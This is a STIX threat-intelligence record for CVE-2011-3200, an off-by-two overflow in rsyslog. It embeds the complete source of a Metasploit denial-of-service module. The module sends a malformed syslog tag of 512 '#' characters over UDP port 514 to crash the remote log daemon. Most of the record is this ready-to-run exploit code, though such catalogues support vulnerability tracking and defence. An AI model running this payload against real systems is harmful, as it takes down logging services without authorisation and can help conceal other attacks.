{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56252e5b-6c7c-4043-82c8-704641675c72",
    "created": "2024-08-14T16:24:26.336122Z",
    "modified": "2024-08-14T16:24:26.336126Z",
    "name": "rsyslog Long Tag Off-By-Two DoS",
    "description": " This module triggers an off-by-two overflow in the rsyslog daemon. This flaw is unlikely to yield code execution but is effective at shutting down a remote log daemon. This bug was introduced in version 4.6.0 and corrected in 4.6.8/5.8.5. Compiler differences may prevent this bug from causing any noticeable result on many systems (RHEL6 is affected). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/syslog/rsyslog_long_tag.rb",
            "external_id": "rsyslog_long_tag.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3200"
        },
        {
            "source_name": "reference",
            "url": "https://www.rsyslog.com/potential-dos-with-malformed-tag/"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=727644"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'rsyslog Long Tag Off-By-Two DoS',\n      'Description' => %q{\n          This module triggers an off-by-two overflow in the\n        rsyslog daemon. This flaw is unlikely to yield code execution\n        but is effective at shutting down a remote log daemon. This bug\n        was introduced in version 4.6.0 and corrected in 4.6.8/5.8.5.\n        Compiler differences may prevent this bug from causing any\n        noticeable result on many systems (RHEL6 is affected).\n      },\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2011-3200'],\n          [ 'URL', 'https://www.rsyslog.com/potential-dos-with-malformed-tag/' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=727644' ],\n        ],\n      'DisclosureDate' => 'Sep 01 2011')\n\n    register_options(\n      [\n        Opt::RPORT(514)\n      ])\n  end\n\n  def run\n    connect_udp\n    pkt = \"<174>\" + (\"#\" * 512) + \":\"\n    print_status(\"Sending message containing a malformed RFC3164 tag to #{rhost}\")\n    udp_sock.put(pkt)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "Sep 01 2011"
}